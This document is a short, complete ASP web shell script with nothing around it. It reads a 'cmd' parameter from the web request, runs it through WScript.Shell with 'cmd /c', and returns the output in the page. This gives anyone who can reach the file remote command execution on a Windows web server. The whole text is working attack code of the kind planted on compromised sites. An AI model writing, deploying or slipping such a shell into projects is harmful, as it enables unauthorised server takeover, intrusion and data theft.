<%
Set rs = CreateObject("WScript.Shell")
Set cmd = request("cmd")
Set shell = rs.Exec("cmd /c " + cmd)
o = shell.StdOut.Readall()
Response.write(o)
%>